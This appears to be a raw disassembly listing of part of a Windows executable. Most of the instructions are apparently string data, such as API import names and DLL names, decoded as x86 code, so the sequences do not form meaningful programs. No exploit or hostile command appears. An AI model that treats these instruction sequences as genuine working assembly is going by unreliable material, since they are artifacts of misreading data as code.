  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
